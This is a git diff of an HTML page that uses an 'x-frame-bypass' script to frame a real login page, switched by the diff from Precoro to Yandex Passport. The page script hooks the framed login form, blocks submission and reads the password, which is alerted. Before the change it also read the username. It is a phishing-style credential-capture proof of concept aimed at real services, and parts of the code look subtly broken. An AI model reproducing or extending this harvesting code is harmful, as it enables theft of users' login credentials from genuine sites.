@@ -28,47 +28,28 @@
 	<script src="x-frame-bypass.js" type="module"></script>
 </head>
 <body>
-	<iframe is="x-frame-bypass" src="https://app.precoro.com/login" class="asd"></iframe>
+	<iframe is="x-frame-bypass" src="https://passport.yandex.ru/auth/welcome" class="asd"></iframe>
 
 	<script>
-        // Функция для выполнения кода внутри iframe после его загрузки
+
         function manipulateIframeContent() {
-            // Получаем доступ к iframe
+            
 		var iframe = document.querySelector('.asd');
 
-            // Проверяем, загрузился ли iframe
             if (iframe && iframe.contentWindow) {
-                // Получаем доступ к содержимому iframe
+
                 var iframeDocument = iframe.contentWindow.document;
 
-                // Пример: Изменяем текст заголовка <h1> в iframe
- 		//var header = iframeDocument.querySelector('h2');
-		var login_form = iframeDocument.getElementById('login_form');
-		var pass_value = iframeDocument.getElementById('password');
-		var user_value = iframeDocument.getElementById('username');
+		var login_form = iframeDocument.getElementsByTagName("form");
+		var pass_value = iframeDocument.getElementById('passp-field-passwd');
 		    
 		login_form.addEventListener('submit', function(event) {
-        		event.preventDefault(); // Prevent the form from submitting
-
-        		// Get the input value
+        		event.preventDefault();
         		var passValue = pass_value.value;
-			var inputValue2 = user_value.value;
-			console.log(passValue)
-        		// Now you can use 'inputValue' as needed
         		alert(passValue);
-			alert(inputValue2);
     		});
-		    
-		     
-               // if (value) {
-                    //header.textContent = "Hello from the parent page!";
-			//alert(iframeDocument.cookie)
-			//alert(value)
-                //}
             }
         }
-
-        // Ожидаем, пока iframe загрузится, и затем вызываем функцию
         document.querySelector('.asd').addEventListener('load', manipulateIframeContent);
     </script>
 </body>
